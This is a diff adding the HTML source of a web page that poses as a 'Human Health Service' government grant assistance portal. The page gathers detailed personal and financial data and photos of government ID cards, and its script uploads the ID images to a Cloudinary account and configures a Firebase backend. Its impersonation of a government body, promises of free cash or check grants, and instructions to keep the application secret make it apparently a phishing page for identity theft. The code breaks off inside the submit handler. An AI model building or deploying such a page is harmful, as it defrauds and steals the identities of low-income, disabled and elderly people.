@@ -1,0 +1,693 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Human Health Service — Grant Assistance Portal</title>
+  <meta name="description" content="HHS Grant Assistance Program — apply online for financial support to help cover essential living expenses, education, healthcare, and more." />
+  <link rel="icon" href="logo.png" type="image/png" />
+  <style>
+    :root {
+      --bg: #ffffff;
+      --surface: #f8fafc;
+      --panel: #ffffff;
+      --border: #e5e7eb;
+      --text: #0f172a;
+      --muted: #475569;
+      --primary: #1d4ed8;
+      --primary-2: #2563eb;
+      --success: #059669;
+      --danger: #dc2626;
+      --focus: #93c5fd;
+      --shadow: 0 10px 30px rgba(2,6,23,0.08);
+    }
+
+    html, body {
+      margin: 0; padding: 0;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      color: var(--text);
+      background: var(--bg);
+      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+    }
+
+    .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+
+    /* Header */
+    .site-header { position: sticky; top: 0; z-index: 40; background: rgba(255,255,255,0.92); backdrop-filter: saturate(180%) blur(8px); border-bottom: 1px solid var(--border); }
+    .nav { display: flex; align-items: center; justify-content: space-between; gap: 16px; padding: 14px 0; }
+    .brand { display: flex; align-items: center; gap: 12px; text-decoration: none; color: inherit; }
+    .brand img.logo { width: 40px; height: 40px; object-fit: contain; }
+    .brand .name { font-weight: 800; letter-spacing: 0.2px; }
+    .brand .sub { color: var(--muted); font-size: 0.88rem; }
+    .nav-links { display: flex; gap: 16px; align-items: center; }
+    .nav-links a { color: #0f172a; text-decoration: none; font-weight: 600; padding: 8px 10px; border-radius: 8px; }
+    .nav-links a:hover { background: var(--surface); }
+
+    .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; border: 0; border-radius: 10px; padding: 12px 16px; cursor: pointer; text-decoration: none; }
+    .btn.primary { background: linear-gradient(180deg, var(--primary), var(--primary-2)); color: #fff; box-shadow: var(--shadow); }
+    .btn.ghost { background: transparent; color: var(--primary-2); border: 1px solid var(--border); }
+    .btn:disabled { opacity: 0.65; cursor: not-allowed; }
+
+    /* Landing */
+    .landing { background: linear-gradient(180deg, #ffffff, #f8fafc 65%); border-bottom: 1px solid var(--border); }
+    .landing .hero { display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 24px; padding: 42px 0; align-items: center; }
+    .landing h1 { font-size: clamp(1.8rem, 3.5vw, 2.6rem); margin: 0 0 8px 0; line-height: 1.15; }
+    .landing p.lead { color: var(--muted); font-size: clamp(1rem, 1.6vw, 1.15rem); margin: 0 0 18px 0; }
+    .landing .card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 16px; box-shadow: var(--shadow); }
+
+    .badges { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 8px; }
+    .badge { background: var(--surface); border: 1px solid var(--border); color: #0f172a; padding: 6px 10px; border-radius: 999px; font-weight: 700; font-size: 0.9rem; }
+
+    .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin: 24px 0 6px; }
+    .feature { background: var(--panel); border: 1px solid var(--border); border-radius: 14px; padding: 16px; }
+    .feature h3 { margin: 8px 0; font-size: 1.05rem; }
+    .feature p { margin: 4px 0; color: var(--muted); }
+
+    /* Steps and panels */
+    .steps { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 18px 0 20px; }
+    .step-chip { display: flex; align-items: center; gap: 10px; background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 12px 14px; color: var(--muted); font-weight: 700; }
+    .step-chip.active { color: var(--text); border-color: #cbd5e1; }
+    .step-num { width: 28px; height: 28px; border-radius: 8px; display: grid; place-items: center; font-size: 0.85rem; background: #eff6ff; color: #1d4ed8; border: 1px solid #bfdbfe; }
+    .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; box-shadow: var(--shadow); }
+
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+
+    label { display: block; font-weight: 700; margin: 6px 0; }
+    .req { color: #dc2626; margin-left: 4px; }
+    input[type="text"], input[type="email"], input[type="tel"], input[type="date"], input[type="number"], select, textarea { width: 100%; background: #ffffff; color: var(--text); border: 1px solid var(--border); border-radius: 10px; padding: 12px 12px; outline: none; box-sizing: border-box; }
+    input:focus, select:focus, textarea:focus { border-color: var(--primary-2); box-shadow: 0 0 0 3px rgba(37,99,235,0.15); }
+    textarea { min-height: 90px; resize: vertical; }
+
+    .actions { margin-top: 20px; display: flex; gap: 12px; flex-wrap: wrap; }
+
+    .help { color: var(--muted); font-size: 0.95rem; }
+    .error { color: #7f1d1d; background: #fee2e2; border: 1px solid #fecaca; padding: 8px 12px; border-radius: 10px; }
+    .success { color: #064e3b; background: #d1fae5; border: 1px solid #a7f3d0; padding: 8px 12px; border-radius: 10px; }
+
+    .hidden { display: none !important; }
+
+    /* Camera */
+    .camera-wrap { position: relative; width: 100%; max-width: 840px; margin: 0 auto; aspect-ratio: 4 / 3; background: #000; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+    video#camera { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #000; }
+    .overlay-rect { position: absolute; inset: 0; display: grid; place-items: center; pointer-events: none; }
+    .overlay-rect .rect { width: min(92%, 620px); height: min(62%, 400px); border: 3px dashed #2563eb; border-radius: 12px; box-shadow: 0 0 0 9999px rgba(0,0,0,0.45); outline: 2px solid rgba(37,99,235,0.2); }
+
+    .preview { display: grid; place-items: center; gap: 8px; margin-top: 12px; }
+
+    /* Upload fallback */
+    .or-divider { display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; gap: 12px; margin: 16px 0; color: var(--muted); }
+    .or-divider::before, .or-divider::after { content: ""; height: 1px; background: var(--border); }
+    .dropzone { border: 2px dashed #cbd5e1; border-radius: 12px; background: var(--surface); padding: 16px; text-align: center; color: var(--muted); }
+    .dropzone.drag { border-color: var(--primary-2); background: #eef2ff; color: #1e3a8a; }
+    .dropzone input[type=file] { display: none; }
+
+    footer { color: var(--muted); font-size: 0.9rem; margin: 28px 0 16px; text-align: center; }
+    a { color: var(--primary-2); text-decoration: none; }
+
+    /* Responsive */
+    @media (max-width: 1024px) { .landing .hero { grid-template-columns: 1fr; padding: 30px 0; } .features { grid-template-columns: 1fr 1fr; } }
+    @media (max-width: 860px) { .steps { grid-template-columns: 1fr 1fr; } .grid-2, .grid-3 { grid-template-columns: 1fr; } .nav { flex-wrap: wrap; } .nav-links { width: 100%; justify-content: flex-start; flex-wrap: wrap; } }
+    @media (max-width: 700px) { .features { grid-template-columns: 1fr; } }
+  </style>
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore-compat.js"></script>
+</head>
+<body>
+  <!-- Header -->
+  <header class="site-header">
+    <div class="container nav">
+      <a href="#home" class="brand" id="nav-home">
+        <img src="logo.png" alt="HHS logo" class="logo" />
+        <div>
+          <div class="name">Human Health Service</div>
+          <div class="sub">Grant Assistance Program</div>
+        </div>
+      </a>
+      <nav class="nav-links" aria-label="Primary">
+        <a href="#home" id="link-home">Home</a>
+        <a href="#program" id="link-program">Program</a>
+        <a href="status.html" id="link-status">Status</a>
+        <a href="#apply" id="link-apply" class="btn primary">Apply now</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Landing -->
+  <main id="home" class="landing">
+    <div class="container">
+      <div class="hero">
+        <div>
+          <h1>Financial support for essential living, education, healthcare, and more</h1>
+          <p class="lead">The Human Health Service (HHS) provides grants to eligible residents — including young adults, retirees, persons with disabilities, unemployed individuals, and low‑income workers — to help maintain a healthy standard of living.</p>
+          <div class="badges">
+            <span class="badge">No application fee</span>
+            <span class="badge">Fast, secure processing</span>
+            <span class="badge">Equal access for all</span>
+          </div>
+          <div class="actions" style="margin-top:16px">
+            <a href="#apply" class="btn primary" id="cta-apply">Start application</a>
+            <a href="#program" class="btn ghost" id="cta-learn">Learn more</a>
+          </div>
+        </div>
+        <div class="card">
+          <h3 style="margin-top:0">Eligibility at a glance</h3>
+          <ul class="help" style="margin: 0 0 12px 18px; line-height: 1.7;">
+            <li>Resident of the state</li>
+            <li>Experiencing financial need or hardship</li>
+            <li>Income and household information provided</li>
+            <li>Valid government-issued ID</li>
+          </ul>
+          <div class="help">You can use grant funds for utilities, rent, food, education, medical expenses, business costs, or essential personal needs.</div>
+        </div>
+      </div>
+
+      <div class="features" id="program">
+        <div class="feature">
+          <h3>What the program is about</h3>
+          <p>This is free assistance you may be entitled to, designed to help you through tough economic conditions. Awards depend on eligibility and verification.</p>
+        </div>
+        <div class="feature">
+          <h3>How it works</h3>
+          <p>Complete the application, capture your ID, review the Terms & Conditions, and submit. We’ll verify details and notify you by email.</p>
+        </div>
+        <div class="feature">
+          <h3>Security and privacy</h3>
+          <p>Your information is processed securely and confidentially. Do not disclose application details until funds are disbursed.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <div class="container" id="apply">
+    <div class="steps" aria-label="Application steps" id="steps-bar">
+      <div class="step-chip" id="chip-1"><div class="step-num">1</div>Application Form</div>
+      <div class="step-chip" id="chip-2"><div class="step-num">2</div>ID Capture</div>
+      <div class="step-chip" id="chip-3"><div class="step-num">3</div>Overview & Terms</div>
+      <div class="step-chip" id="chip-4"><div class="step-num">4</div>Processing</div>
+    </div>
+
+    <!-- STEP 1: FORM -->
+    <section class="panel" id="step-1" role="region" aria-labelledby="chip-1">
+      <h2 style="margin-top:0">Applicant Information</h2>
+      <p class="help">Provide accurate details. Required fields are marked with an asterisk.</p>
+      <form id="application-form" novalidate>
+        <div class="grid-2">
+          <div>
+            <label for="fullName">Full name<span class="req">*</span></label>
+            <input id="fullName" name="fullName" type="text" required autocomplete="name" />
+          </div>
+          <div>
+            <label for="dob">Date of birth<span class="req">*</span></label>
+            <input id="dob" name="dob" type="date" required />
+          </div>
+        </div>
+
+        <div class="grid-3">
+          <div>
+            <label for="gender">Gender<span class="req">*</span></label>
+            <select id="gender" name="gender" required>
+              <option value="">Select…</option>
+              <option>Female</option>
+              <option>Male</option>
+              <option>Non-binary</option>
+              <option>Prefer not to say</option>
+              <option>Other</option>
+            </select>
+          </div>
+          <div>
+            <label for="email">Email address<span class="req">*</span></label>
+            <input id="email" name="email" type="email" required autocomplete="email" />
+          </div>
+          <div>
+            <label for="phone">Phone number<span class="req">*</span></label>
+            <input id="phone" name="phone" type="tel" required autocomplete="tel" placeholder="e.g., +1 555 123 4567" />
+          </div>
+        </div>
+
+        <div>
+          <label for="address">Home address<span class="req">*</span></label>
+          <textarea id="address" name="address" required placeholder="Street, City, State/Province, Postal Code, Country"></textarea>
+        </div>
+
+        <div class="grid-3">
+          <div>
+            <label for="occupation">Occupation<span class="req">*</span></label>
+            <input id="occupation" name="occupation" type="text" required />
+          </div>
+          <div>
+            <label for="employmentStatus">Employment status<span class="req">*</span></label>
+            <select id="employmentStatus" name="employmentStatus" required>
+              <option value="">Select…</option>
+              <option>Employed</option>
+              <option>Self-employed</option>
+              <option>Unemployed</option>
+              <option>Retired</option>
+              <option>Student</option>
+            </select>
+          </div>
+          <div>
+            <label for="monthlyIncome">Monthly income (USD)<span class="req">*</span></label>
+            <input id="monthlyIncome" name="monthlyIncome" type="number" min="0" step="0.01" required />
+          </div>
+        </div>
+
+        <div class="grid-3">
+          <div>
+            <label>Payment preference<span class="req">*</span></label>
+            <select id="paymentPreference" name="paymentPreference" required>
+              <option value="">Select…</option>
+              <option value="Cash">Cash</option>
+              <option value="Check">Check</option>
+            </select>
+          </div>
+          <div>
+            <label>Housing status<span class="req">*</span></label>
+            <select id="housingStatus" name="housingStatus" required>
+              <option value="">Select…</option>
+              <option value="Own">Own a house</option>
+              <option value="Rent">Rent an apartment</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+          <div>
+            <label for="householdSize">Household size<span class="req">*</span></label>
+            <input id="householdSize" name="householdSize" type="number" min="1" step="1" required />
+          </div>
+        </div>
+
+        <div class="grid-3">
+          <div>
+            <label for="maritalStatus">Marital status<span class="req">*</span></label>
+            <select id="maritalStatus" name="maritalStatus" required>
+              <option value="">Select…</option>
+              <option>Single</option>
+              <option>Married</option>
+              <option>Divorced</option>
+              <option>Widowed</option>
+            </select>
+          </div>
+          <div>
+            <label for="disabilityStatus">Disability status</label>
+            <select id="disabilityStatus" name="disabilityStatus">
+              <option value="">Prefer not to say</option>
+              <option value="Yes">Yes</option>
+              <option value="No">No</option>
+            </select>
+          </div>
+          <div>
+            <label for="veteranStatus">Veteran status</label>
+            <select id="veteranStatus" name="veteranStatus">
+              <option value="">Prefer not to say</option>
+              <option value="Yes">Yes</option>
+              <option value="No">No</option>
+            </select>
+          </div>
+        </div>
+
+        <hr style="border: 0; border-top: 1px solid var(--border); margin: 20px 0;" />
+
+        <h3>Declarations</h3>
+        <div>
+          <label style="display:flex; gap:10px; align-items:flex-start"><input type="checkbox" id="declAccuracy" required /> <span>I certify that the information provided is accurate and complete to the best of my knowledge.<span class="req">*</span></span></label>
+        </div>
+        <div>
+          <label style="display:flex; gap:10px; align-items:flex-start"><input type="checkbox" id="declConsent" required /> <span>I consent to the processing of my data for the purpose of determining eligibility for this program.<span class="req">*</span></span></label>
+        </div>
+        <div class="field-note help">You will review and accept program Terms & Conditions in the next step.</div>
+
+        <div id="form-error" class="error hidden" role="alert"></div>
+
+        <div class="actions">
+          <button type="submit" id="btn-to-id" class="btn primary">Continue to ID Verification</button>
+          <button type="button" class="btn ghost" id="btn-save-draft">Save draft</button>
+        </div>
+      </form>
+    </section>
+
+    <!-- STEP 2: CAMERA / ID CAPTURE -->
+    <section class="panel hidden" id="step-2" role="region" aria-labelledby="chip-2">
+      <h2 style="margin-top:0">Identity Verification</h2>
+      <p class="help">Place your government-issued ID card inside the rectangle and click Snap. Or upload a photo/scan if you prefer.</p>
+
+      <div class="camera-wrap" id="cameraWrap">
+        <video id="camera" autoplay playsinline></video>
+        <div class="overlay-rect" aria-hidden="true">
+          <div class="rect" id="captureRect" title="Align ID card within this area"></div>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button type="button" id="btn-start-camera" class="btn ghost">Start camera</button>
+        <button type="button" id="btn-snap" class="btn primary" disabled>Snap</button>
+        <button type="button" class="btn ghost" id="btn-retake" disabled>Retake</button>
+      </div>
+
+      <div class="or-divider" aria-hidden="true"><span>or</span></div>
+
+      <div class="dropzone" id="dropzone">
+        <p style="margin: 6px 0">Drag & drop an image of your ID here, or</p>
+        <label for="fileInput" class="btn ghost" style="cursor:pointer;">Choose file</label>
+        <input id="fileInput" type="file" accept="image/*" capture="environment" />
+        <div class="help" style="margin-top:8px">Accepted formats: JPG, PNG. The image will be stored securely and linked to your application.</div>
+      </div>
+
+      <div class="preview" id="snapPreview" aria-live="polite"></div>
+      <div id="camera-error" class="error hidden" role="alert"></div>
+
+      <div class="actions">
+        <button type="button" id="btn-to-terms" class="btn primary" disabled>Continue to Program Overview & Terms</button>
+        <button type="button" class="btn ghost" id="btn-back-1">Back to Form</button>
+      </div>
+    </section>
+
+    <!-- STEP 3: OVERVIEW & TERMS -->
+    <section class="panel hidden" id="step-3" role="region" aria-labelledby="chip-3">
+      <h2 style="margin-top:0">Program Overview</h2>
+      <div class="help" style="margin-top:-6px; margin-bottom: 10px;">While we verify your information, please review the program details and Terms & Conditions.</div>
+      <div class="terms">
+        <p>
+          The Human Health Service (HHS) Grant Program provides financial assistance to eligible residents — including young adults,
+          retirees, individuals with disabilities, unemployed persons, low-income workers, and other citizens — to help maintain a
+          healthy standard of living and reduce poverty. Funds may be used for essentials such as housing, utilities, food,
+          education, healthcare, business stabilization, and other necessary costs.
+        </p>
+
+        <h3>Key Points</h3>
+        <ul>
+          <li>This is a free assistance program. There is no application or processing fee.</li>
+          <li>Eligibility and award amounts are determined based on information you provide and supporting verification.</li>
+          <li>Payments are disbursed by your selected method (cash pickup or check) following successful verification.</li>
+        </ul>
+
+        <h3>Terms and Conditions</h3>
+        <ul>
+          <li><strong>Accuracy and verification:</strong> You certify that all information submitted is true and complete. HHS may verify application details and request additional documentation.</li>
+          <li><strong>Privacy and security:</strong> Protect your personal information. Do not share verification codes or sensitive data with others. Official notifications will be sent from authorized HHS channels only.</li>
+          <li><strong>Confidentiality:</strong> To safeguard your privacy and ensure secure processing, do not publish your application details or payment arrangements in public forums until disbursement is complete.</li>
+          <li><strong>No third-party claims:</strong> Only verified applicants may receive funds. Attempted transfer of award rights or impersonation leads to disqualification.</li>
+          <li><strong>Compliance:</strong> You agree to follow all program rules and applicable laws. Providing false information may result in denial, recovery of funds, and/or legal action.</li>
+          <li><strong>Communication:</strong> Processing updates will be sent to your registered email address. Keep your contact details current.</li>
+          <li><strong>Use of funds:</strong> Funds should be used for essential and lawful purposes as described in the program overview.</li>
+          <li><strong>Non-discrimination:</strong> HHS does not discriminate on the basis of age, gender, disability, marital status, or any protected characteristic.</li>
+          <li><strong>Data handling:</strong> Your information is processed and stored in accordance with applicable privacy regulations.</li>
+        </ul>
+
+        <div class="panel" style="margin-top: 12px;">
+          <label style="display:flex; gap:10px; align-items:flex-start"><input type="checkbox" id="ackOverview" /> <span>I have read and understand the program overview.</span></label>
+          <label style="display:flex; gap:10px; align-items:flex-start"><input type="checkbox" id="ackTerms" /> <span>I agree to the Terms & Conditions and the Privacy Notice.</span></label>
+          <label style="display:flex; gap:10px; align-items:flex-start"><input type="checkbox" id="ackEmail" /> <span>I consent to receive application updates at my registered email address.</span></label>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button type="button" id="btn-submit" class="btn primary" disabled>Submit Application</button>
+        <button type="button" class="btn ghost" id="btn-back-2">Back to ID Capture</button>
+      </div>
+    </section>
+
+    <!-- STEP 4: PROCESSING -->
+    <section class="panel hidden" id="step-4" role="region" aria-labelledby="chip-4">
+      <h2 style="margin-top:0">Application Received</h2>
+      <div class="processing">
+        <div class="badge">In review</div>
+        <p>
+          Thank you for your submission. We are reviewing your information to confirm its authenticity and to determine eligibility.
+          You will receive updates and a decision at the email address you provided.
+        </p>
+        <p id="appRefWrap" class="help"></p>
+        <div class="actions">
+          <a id="btn-view-status" class="btn ghost" href="status.html">View status page</a>
+          <button type="button" class="btn primary" id="btn-new">Start a new application</button>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      Human Health Service — Assistance Program • © <span id="year"></span>
+    </footer>
+  </div>
+
+  <script>
+    // Cloudinary configuration
+    const CLOUDINARY_CLOUD = 'dvfq5lq8m';
+    const CLOUDINARY_PRESET = 'hhs_unsigned';
+    const CLOUDINARY_FOLDER = 'hhs/id-cards';
+    const CLOUDINARY_UPLOAD_URL = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD}/image/upload`;
+
+    async function uploadToCloudinary(dataUrl) {
+      const fd = new FormData();
+      fd.append('file', dataUrl);
+      fd.append('upload_preset', CLOUDINARY_PRESET);
+      if (CLOUDINARY_FOLDER) fd.append('folder', CLOUDINARY_FOLDER);
+      fd.append('context', 'source=hhs-portal');
+      const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: fd });
+      const json = await res.json();
+      if (!res.ok) throw new Error(json?.error?.message || 'Upload failed');
+      return json; // secure_url, public_id, etc.
+    }
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdKDjmlXH8tFtF4rCvIzx11s4MgFSdFq0",
+      authDomain: "kfdn-8bdeb.firebaseapp.com",
+      projectId: "kfdn-8bdeb",
+      storageBucket: "kfdn-8bdeb.firebasestorage.app",
+      messagingSenderId: "122949220202",
+      appId: "1:122949220202:web:ba7b16a5d63599452f5713",
+      measurementId: "G-5BFYZ4DY0K"
+    };
+    const appFB = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Step visibility and navigation
+    const steps = [ document.getElementById('step-1'), document.getElementById('step-2'), document.getElementById('step-3'), document.getElementById('step-4') ];
+    const chips = [ document.getElementById('chip-1'), document.getElementById('chip-2'), document.getElementById('chip-3'), document.getElementById('chip-4') ];
+
+    function showStep(idx) {
+      document.querySelector('.landing').classList.add('hidden');
+      document.getElementById('steps-bar').classList.remove('hidden');
+      steps.forEach((s, i) => s.classList.toggle('hidden', i !== idx - 1));
+      chips.forEach((c, i) => c.classList.toggle('active', i <= idx - 1));
+      document.getElementById('apply').scrollIntoView({ behavior: 'smooth' });
+      localStorage.setItem('hhsCurrentStep', String(idx));
+    }
+
+    function showLanding() {
+      document.querySelector('.landing').classList.remove('hidden');
+      document.getElementById('steps-bar').classList.add('hidden');
+      steps.forEach(s => s.classList.add('hidden'));
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      localStorage.removeItem('hhsCurrentStep');
+    }
+
+    // Header navigation bindings
+    document.getElementById('nav-home').addEventListener('click', (e) => { e.preventDefault(); showLanding(); });
+    document.getElementById('link-home').addEventListener('click', (e) => { e.preventDefault(); showLanding(); });
+    function gotoProgram() { showStep(3); }
+    document.getElementById('link-program').addEventListener('click', (e) => { e.preventDefault(); gotoProgram(); });
+    document.getElementById('link-apply').addEventListener('click', (e) => { e.preventDefault(); showStep(1); });
+    document.getElementById('cta-apply').addEventListener('click', (e) => { e.preventDefault(); showStep(1); });
+    document.getElementById('cta-learn').addEventListener('click', (e) => { e.preventDefault(); gotoProgram(); });
+
+    // Persist and restore
+    const form = document.getElementById('application-form');
+    const formError = document.getElementById('form-error');
+
+    function saveFormToStorage() { const data = Object.fromEntries(new FormData(form).entries()); localStorage.setItem('hhsApplication', JSON.stringify(data)); return data; }
+    function restoreFormFromStorage() { const raw = localStorage.getItem('hhsApplication'); if (!raw) return; try { const data = JSON.parse(raw); Object.keys(data).forEach(k => { const el = form.elements.namedItem(k); if (el) el.value = data[k]; }); } catch {} }
+
+    // Validation helpers
+    function isValidEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+    function requireFields(names) { const missing = []; names.forEach(n => { const el = form.elements.namedItem(n); if (!el) return; const val = el.value ? String(el.value).trim() : ''; if (!val) missing.push(n); }); return missing; }
+
+    document.getElementById('btn-save-draft').addEventListener('click', () => { saveFormToStorage(); formError.classList.add('hidden'); formError.textContent = ''; alert('Draft saved locally on this device.'); });
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const required = ['fullName','dob','gender','email','phone','address','occupation','employmentStatus','monthlyIncome','paymentPreference','housingStatus','householdSize','maritalStatus'];
+      const missing = requireFields(required);
+      const email = form.elements.namedItem('email').value;
+      if (!isValidEmail(email)) missing.push('email');
+
+      if (!document.getElementById('declAccuracy').checked || !document.getElementById('declConsent').checked) {
+        formError.textContent = 'Please accept the declarations to continue.';
+        formError.classList.remove('hidden');
+        return;
+      }
+
+      if (missing.length) {
+        formError.textContent = 'Please complete all required fields.';
+        formError.classList.remove('hidden');
+        return;
+      }
+
+      saveFormToStorage();
+      formError.classList.add('hidden');
+      formError.textContent = '';
+      showStep(2);
+    });
+
+    document.getElementById('btn-back-1').addEventListener('click', () => showStep(1));
+
+    // Camera and upload handling
+    const btnStart = document.getElementById('btn-start-camera');
+    const btnSnap = document.getElementById('btn-snap');
+    const btnRetake = document.getElementById('btn-retake');
+    const btnToTerms = document.getElementById('btn-to-terms');
+    const video = document.getElementById('camera');
+    const cameraError = document.getElementById('camera-error');
+    const snapPreview = document.getElementById('snapPreview');
+    const captureRect = document.getElementById('captureRect');
+    const dropzone = document.getElementById('dropzone');
+    const fileInput = document.getElementById('fileInput');
+    let stream;
+
+    async function startCamera() {
+      cameraError.classList.add('hidden'); cameraError.textContent = '';
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+        video.srcObject = stream; btnSnap.disabled = false; btnRetake.disabled = true;
+      } catch (err) {
+        cameraError.textContent = 'Unable to access camera. You can allow camera permissions or upload an image instead below.';
+        cameraError.classList.remove('hidden');
+      }
+    }
+
+    function stopCamera() { if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; } video.srcObject = null; }
+
+    function captureFromVideo() {
+      const videoRect = video.getBoundingClientRect(); const overlayRect = captureRect.getBoundingClientRect();
+      if (!video.videoWidth || !video.videoHeight) return null;
+      const scaleX = video.videoWidth / videoRect.width; const scaleY = video.videoHeight / videoRect.height;
+      const sx = Math.max(0, (overlayRect.left - videoRect.left) * scaleX);
+      const sy = Math.max(0, (overlayRect.top - videoRect.top) * scaleY);
+      const sw = Math.min(video.videoWidth, overlayRect.width * scaleX);
+      const sh = Math.min(video.videoHeight, overlayRect.height * scaleY);
+      const canvas = document.createElement('canvas'); canvas.width = Math.round(sw); canvas.height = Math.round(sh);
+      const ctx = canvas.getContext('2d'); ctx.save(); ctx.translate(canvas.width, 0); ctx.scale(-1, 1); ctx.drawImage(video, sx, sy, sw, sh, 0, 0, canvas.width, canvas.height); ctx.restore();
+      return canvas.toDataURL('image/png');
+    }
+
+    function renderPreview(dataUrl, noteClass, noteText, includeDownload = true) {
+      snapPreview.innerHTML = '';
+      const img = document.createElement('img'); img.src = dataUrl; img.alt = 'ID preview'; img.style.maxWidth = '520px'; img.style.border = '1px solid var(--border)'; img.style.borderRadius = '12px';
+      const note = document.createElement('div'); note.className = noteClass; note.textContent = noteText;
+      snapPreview.append(img, note);
+          }
+
+    async function uploadAndLink(dataUrl) {
+      // Store local copy
+      localStorage.setItem('hhsIdImage', dataUrl);
+      btnToTerms.disabled = true; btnRetake.disabled = false; btnSnap.disabled = true;
+      renderPreview(dataUrl, 'help', 'Uploading ID image to secure storage…');
+      try {
+        const result = await uploadToCloudinary(dataUrl);
+        localStorage.setItem('hhsCloudinaryUrl', result.secure_url || '');
+        localStorage.setItem('hhsCloudinaryPublicId', result.public_id || '');
+        renderPreview(dataUrl, 'success', 'ID image uploaded and linked to your application.');
+        btnToTerms.disabled = false;
+      } catch (e) {
+        renderPreview(dataUrl, 'error', `Upload failed: ${e.message}. You can retry or pick another image.`);
+        btnToTerms.disabled = true;
+      } finally {
+        stopCamera();
+      }
+    }
+
+    btnStart.addEventListener('click', startCamera);
+    btnSnap.addEventListener('click', () => { const dataUrl = captureFromVideo(); if (!dataUrl) { cameraError.textContent = 'Capture failed. Ensure the camera is on and try again.'; cameraError.classList.remove('hidden'); return; } uploadAndLink(dataUrl); });
+    btnRetake.addEventListener('click', () => { snapPreview.innerHTML = ''; localStorage.removeItem('hhsIdImage'); localStorage.removeItem('hhsCloudinaryUrl'); localStorage.removeItem('hhsCloudinaryPublicId'); btnToTerms.disabled = true; btnRetake.disabled = true; btnSnap.disabled = false; startCamera(); });
+
+    // Upload fallback logic (drag & drop or file chooser)
+    function processImageFile(file) {
+      if (!file || !file.type.startsWith('image/')) return;
+      const reader = new FileReader();
+      reader.onload = () => {
+        const img = new Image();
+        img.onload = () => {
+          const rect = captureRect.getBoundingClientRect(); const targetW = Math.max(320, Math.round(rect.width)); const targetH = Math.max(200, Math.round(rect.height));
+          const canvas = document.createElement('canvas'); canvas.width = targetW; canvas.height = targetH; const ctx = canvas.getContext('2d');
+          const scale = Math.max(targetW / img.naturalWidth, targetH / img.naturalHeight);
+          const drawW = img.naturalWidth * scale; const drawH = img.naturalHeight * scale; const dx = (targetW - drawW) / 2; const dy = (targetH - drawH) / 2;
+          ctx.fillStyle = '#fff'; ctx.fillRect(0, 0, targetW, targetH); ctx.drawImage(img, dx, dy, drawW, drawH);
+          const dataUrl = canvas.toDataURL('image/png');
+          uploadAndLink(dataUrl);
+        };
+        img.src = reader.result;
+      };
+      reader.readAsDataURL(file);
+    }
+
+    dropzone.addEventListener('dragover', (e) => { e.preventDefault(); dropzone.classList.add('drag'); });
+    dropzone.addEventListener('dragleave', () => dropzone.classList.remove('drag'));
+    dropzone.addEventListener('drop', (e) => { e.preventDefault(); dropzone.classList.remove('drag'); const file = e.dataTransfer.files && e.dataTransfer.files[0]; processImageFile(file); });
+    fileInput.addEventListener('change', () => { const f = fileInput.files && fileInput.files[0]; processImageFile(f); });
+
+    // Terms acknowledgements
+    const ackOverview = document.getElementById('ackOverview');
+    const ackTerms = document.getElementById('ackTerms');
+    const ackEmail = document.getElementById('ackEmail');
+    const btnSubmit = document.getElementById('btn-submit');
+    function updateSubmitEnabled() { btnSubmit.disabled = !(ackOverview.checked && ackTerms.checked && ackEmail.checked); }
+    [ackOverview, ackTerms, ackEmail].forEach(cb => cb.addEventListener('change', updateSubmitEnabled));
+
+    document.getElementById('btn-back-2').addEventListener('click', () => showStep(2));
+
+    function generateRef() { const ts = Date.now().toString(36).toUpperCase(); const rnd = Math.random().toString(36).slice(2, 7).toUpperCase(); return `HHS-${ts}-${rnd}`; }
+
+    
+    btnSubmit.addEventListener('click', async () => {
+      const formRaw = localStorage.getItem('hhsApplication');
+      if (!formRaw) { alert('Form data missing. Returning to Step 1.'); showStep(1); return; }
+
+      // Ensure Cloudinary URL exists; if not and we have a local image, try uploading now
+      let cloudUrl = localStorage.getItem('hhsCloudinaryUrl');
+      const localImg = localStorage.getItem('hhsIdImage');
+      if (!cloudUrl && localImg) {
+        try { const up = await uploadToCloudinary(localImg); localStorage.setItem('hhsCloudinaryUrl', up.secure_url || ''); localStorage.setItem('hhsCloudinaryPublicId', up.public_id || ''); cloudUrl = up.secure_url; }
+        catch (e) { alert('Unable to upload ID image to Cloudinary. Please ensure the upload preset is configured and try again.'); return; }
+      }
